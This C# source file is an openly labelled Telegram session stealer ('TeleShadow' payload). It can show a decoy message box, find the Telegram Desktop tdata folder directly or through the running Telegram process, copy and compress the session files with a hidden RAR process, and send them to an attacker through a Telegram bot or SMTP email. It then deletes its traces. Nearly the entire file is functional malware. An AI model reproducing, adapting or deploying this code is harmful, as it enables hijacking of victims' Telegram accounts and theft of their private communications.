using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Teleshadow_Paylaod_V2._0
{
    class Program
    {
        #region Variables
        private static string Session = null;
        private static string Token = null;
        private static string ID = null;
        private static string Method = null;
        private static bool FT = true;
        internal static string Hacker_Email = null;  // Send To
        internal static string Email = null; // Send From 
        internal static string Password = null;// Email Password 
        internal static string SMTP = null; // Smtp Server 
        internal static int SMTP_Port = 25; // Smtp Port
        #endregion

        #region Main
        static byte[] Reverse(byte[] Data)
        {
            byte[] Temp = new byte[Data.Length];
            for (int i = 0; i < Data.Length; i++)
            {
                Temp[(Temp.Length - 1) - i] = Data[i];
            }
            return Temp;
        }
        static void Main(string[] args)
        {
            string[] Config = new string[6];
            string FMessage = null;
            #region Read Config
            try
            {
                try
                {
                    byte[] Stub = System.IO.File.ReadAllBytes(Application.ExecutablePath.ToString());
                    byte[] ConfigArry = new byte[1024];
                    Array.ConstrainedCopy(Stub, Stub.Length - 1024, ConfigArry, 0, 1024);
                    ConfigArry = Reverse(ConfigArry);
                    string ConfigString = Encoding.UTF8.GetString(ConfigArry).TrimEnd('\x00');
                    Config = ConfigString.Split('`');
                }
                catch { Application.Exit(); }
                if (Config[0] == "0")
                {
                    try
                    {
                        Token = Config[1];
                        ID = Config[2];
                        FMessage = Config[3];
                        Method = "Telegram";
                    }
                    catch (Exception) { }
                }
                else
                {
                    try
                    {
                        string Mail = Config[1];
                        string[] MailConfig = Mail.Split('~');
                        SMTP = MailConfig[0];
                        Hacker_Email = Config[2];
                        Password = MailConfig[2];
                        Email = MailConfig[1];
                        FMessage = Config[3];
                        Method = "SMTP";
                    }
                    catch (Exception) { }
                }
            }
            catch { }
            #endregion

            #region RunConfig
            if (FMessage != "N~N~N")
            {
                try
                {
                    string[] FMC = FMessage.Split('~');
                    string Type = FMC[0];
                    string Title = FMC[1];
                    string Body = FMC[2];
                    if (Type == "Question")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Question);
                    }
                    else if (Type == "Info")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else if (Type == "Error")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch { }
            }
            #endregion

            #region Check Default Location
            string TDataDefaultLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Telegram Desktop\tdata";
            Console.WriteLine("Checking Default Location...");
            Report2Tel("Checking Default Location...");
            Console.WriteLine(TDataDefaultLocation);
            if (Directory.Exists(TDataDefaultLocation))
            {
                Console.WriteLine("Detected Session !");
                Report2Tel("Detected Session !" + Environment.NewLine + "NOTE: User Used Default Location !");
                Session = HuntSession(TDataDefaultLocation);
            }
            else
            {
                Console.WriteLine("tdata not exists, User Used Custom Location !");
                Report2Tel("TData not exists, User Used Custom Location !");
                #region Wait For Proccess
                Console.WriteLine("\nWaiting For Telegram Proccess To Track Location...");
                Report2Tel("Waiting For Telegram Proccess To Track Location...");
                string SessionLocation = TryHookProccess();
                Begin:
                try
                {
                    if (SessionLocation != "NotHooked")
                    {
                        Session = HuntSession(SessionLocation);
                    }
                    else
                    {
                        //Wait For Proccess...
                        if (FT)
                        {
                            Report2Tel("Telegram is not running! Please Wait...");
                            FT = false;
                        }
                        while (SessionLocation == "NotHooked")
                        {
                            SessionLocation = TryHookProccess();
                        }
                        goto Begin;
                    }
                }
                catch { }
                #endregion
            }
            #endregion
            Thread.Sleep(1000);
            if (File.Exists(Session))
            {
                SendTData(Session);
            }
            Thread.Sleep(1000);
            ClearLogs();
            Application.Exit();
        }

        #endregion

        static void ClearLogs()
        {
            try
            {
                System.Threading.Thread.Sleep(5000); // if you get error on this line please disable clear log in main and delete this child class
                String Temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\TeleShadow";
                DirectoryInfo Dir = new DirectoryInfo(Temp);
                foreach (FileInfo SingleFile in Dir.GetFiles())
                {
                    SingleFile.Delete();
                }
                foreach (DirectoryInfo SingleDirectory in Dir.GetDirectories())
                {
                    SingleDirectory.Delete(true);
                }
                Directory.Delete(Temp);
                string Romaing = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] Compress = { Romaing + @"\rar_cli.exe", Romaing + @"\Session.rar" };
                File.Delete(Compress[0]);
                File.Delete(Compress[1]);
            }
            catch (Exception)
            { }
        }
        #region Reporter
        private static void Report2Tel(string msg)
        {
            if (Method == "Telegram")
            {
                string _Url = "https://api.telegram.org/bot" + Token + "/sendMessage?chat_id=" + ID + "&parse_mode=html&text=<b>" + msg + "</b>";
                try
                { string Response = new WebClient().DownloadString(_Url); }
                catch (Exception)
                { }

            }
        }
        #endregion

        #region TryHookProccess
        private static string TryHookProccess()
        {
            bool HookedTelegram = false;
            string SessionLocation = null;
            try
            {
                Process[] process = Process.GetProcesses();
                foreach (Process prs in process)
                {
                    if (prs.ProcessName == "Telegram")
                    {
                        if (!FT)
                        {
                            Report2Tel("Detected Telegram !");
                        }
                        Console.WriteLine(Environment.NewLine);
                        Console.WriteLine("Proccess: " + prs.ProcessName);
                        Report2Tel("Proccess: " + prs.ProcessName);
                        ReErr:
                        try
                        {
                            Console.WriteLine("Location: " + prs.MainModule.FileName);
                            Report2Tel("Location: " + prs.MainModule.FileName);
                        }
                        catch
                        {
                            goto ReErr;
                        }
                        SessionLocation = prs.MainModule.FileName.Replace("\\Telegram.exe", "") + "\\tdata";
                        Console.WriteLine("Session Location: " + SessionLocation + Environment.NewLine);
                        Report2Tel("Session Location: " + SessionLocation);
                        HookedTelegram = true;
                        break;//if we dont break here and another telegram proccess exists, then TryHookProcess will hook last one (in this case second one)
                    }

                }
            }
            catch { }
            if (!HookedTelegram)
            {
                return "NotHooked";
            }
            else
            {
                return SessionLocation;
            }
        }
        #endregion

        #region HuntSession
        private static string HuntSession(string TDataLocation)
        {
            Console.WriteLine("\nHooked Telegram...");
            string Temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\TeleShadow";
            Directory.CreateDirectory(Temp);
            string[] Files, Directoryes;
            string SuperDirectory = null;

            #region Get Session
            try
            {
                if (Directory.Exists(Temp))
                {
                    DirectoryInfo dir = new DirectoryInfo(Temp);
                    dir.Delete(true);
                }
            }
            catch { }

            if (Directory.Exists(TDataLocation)) //Get Telegram Session
            {
                Files = Directory.GetFiles(TDataLocation);
                Directoryes = Directory.GetDirectories(TDataLocation);
                Directory.CreateDirectory(Temp + @"\TelegramSession\" + "tdata");
                foreach (var Single in Directoryes)
                {
                    try
                    {

                        DirectoryInfo Check = new DirectoryInfo(Single);
                        if (Convert.ToInt64(Check.Name.Length) > 15)
                        {
                            Directory.CreateDirectory(Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                            SuperDirectory = Check.Name;
                        }
                    }
                    catch { }
                }
                foreach (var Single in Files)
                {
                    try
                    {
                        FileInfo Check = new FileInfo(Single);
                        if (Convert.ToInt64(Check.Length) < 5000 &&
                            Check.Name.Length > 15 &&
                            Path.GetExtension(Single) != ".json")
                        {
                            File.Copy(Single, Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                        }
                    }
                    catch (Exception) { }
                }
                string[] Map =
                        {
                         TDataLocation + @"\" + SuperDirectory + @"\map0",
                         TDataLocation + @"\" + SuperDirectory + @"\map1"
                        };
                if (File.Exists(Map[0]))
                {
                    File.Copy(Map[0], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map0");
                }
                if (File.Exists(Map[1]))
                {
                    File.Copy(Map[1], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map1");
                }
            }
            #endregion

            //compress session
            return CompressSession(Temp + @"\TelegramSession\");
        }
        #endregion

        #region Compress
        private static string CompressSession(string TDataLocation)
        {
            #region Run RAR Proccess
            string RCL = TDataLocation.Replace("\\tdata", "");
            try
            {
                Console.WriteLine("\nCompressing Session...");
                Report2Tel("Compressing Session...");
                File.WriteAllBytes(RCL + @"\rar_cli.exe", Properties.Resources.rar_cli);
                System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                cmd.StartInfo.WorkingDirectory = RCL;
                cmd.StartInfo.FileName = "rar_cli.exe";
                cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                cmd.StartInfo.Arguments = "a -ep1 -r Session.rar tdata";
                cmd.Start();
            }
            catch { }
            #endregion
            string _location = TDataLocation.Replace("tdata", "");
            return TDataLocation + @"\Session.rar";

        }

        #region SendTData
        private static void SendTData(string TData)
        {
            //upload TData
            if (Method == "Telegram")
            {
                Report2Tel("Sending TData...");
                Byte[] _File_Bytes = System.IO.File.ReadAllBytes(TData);
                string _File_Name = TData;
                string _Url = "https://api.telegram.org/bot" + Token + "/sendDocument?chat_id=" + ID + "&caption=LocalTime: " + System.DateTime.Now.ToString();
                UploadMultipart(_File_Bytes, _File_Name, "application/x-ms-dos-executable", _Url);
            }
            else
            {
                MailTDATA(TData, Email, Password, Hacker_Email, SMTP, SMTP_Port);
            }

        }
        #endregion

        #region Telegram Bot HTTP Post
        private static void UploadMultipart(byte[] file, string filename, string contentType, string url)
        {
            try
            {
                var webClient = new WebClient();
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                var fileData = webClient.Encoding.GetString(file);
                var package = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", boundary, filename, contentType, fileData);

                var nfile = webClient.Encoding.GetBytes(package);

                byte[] resp = webClient.UploadData(url, "POST", nfile);

                Environment.Exit(0);
            }
            catch { }
        }
        #endregion
        static void MailTDATA(string Attach, string From, string Password, string TO, string Server, int Port)
        {
            try
            {
                MailMessage Transfer = new System.Net.Mail.MailMessage();
                SmtpClient SmtpServer = new System.Net.Mail.SmtpClient(Server);
                Transfer.From = new System.Net.Mail.MailAddress(From);
                Transfer.Subject = "[TeleShadow - " + "Telegram Session]";
                Transfer.Body =
                "MachineName : " + Environment.MachineName.ToString() + Environment.NewLine
              + "OperationSystem : " + Environment.OSVersion.ToString() + Environment.NewLine;
                var Attachment = new System.Net.Mail.Attachment(Attach);
                Transfer.Attachments.Add(Attachment);
                SmtpServer.Port = Port;
                SmtpServer.Credentials = new System.Net.NetworkCredential(From, Password);
                Transfer.To.Add(TO);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(Transfer);
                Transfer.Dispose();

            }
            catch (Exception)
            { }
        }
    }
    #endregion
}